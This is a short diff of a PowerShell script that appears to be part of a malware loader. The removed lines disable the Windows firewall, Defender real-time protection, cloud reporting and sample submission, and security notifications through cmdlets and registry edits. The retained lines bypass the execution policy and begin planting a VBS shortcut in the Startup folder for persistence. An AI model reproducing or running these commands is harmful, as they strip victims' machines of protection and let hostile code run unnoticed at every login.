@@ -1,17 +1,4 @@
 Set-ExecutionPolicy Bypass -Scope Process -Force
-Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
-Set-MpPreference -DisableRealtimeMonitoring $true
-Set-MpPreference -MAPSReporting Disabled
-Set-MpPreference -SubmitSamplesConsent NeverSend
-Set-MpPreference -SubmitSamplesConsent 2
-reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' /v 'DisableRealtimeMonitoring' /t REG_DWORD /d '1' /f
-reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f
-reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet' /v 'DisableBlockAtFirstSeen' /t REG_DWORD /d '1' /f
-reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PasswordLess\Device' /v DevicePasswordLessBuildVersion /t REG_DWORD /d 0 /f
-Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1
-Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'SubmitSamplesConsent' -Value 2
-reg add 'HKCU\Software\Microsoft\Windows\CurrentVersion\PushNotifications' /v 'ToastEnabled' /t REG_DWORD /d '0' /f
-reg add 'HKCU\Software\Policies\Microsoft\Windows Defender Security Center\Notifications' /v 'DisableEnhancedNotifications' /t REG_DWORD /d '1' /f
 $source = "C:\Users\Public\Downloads\Autorun.vbs"
 $startupPath = [Environment]::GetFolderPath("Startup")
 $destination = Join-Path $startupPath "Autorun.vbs.lnk"
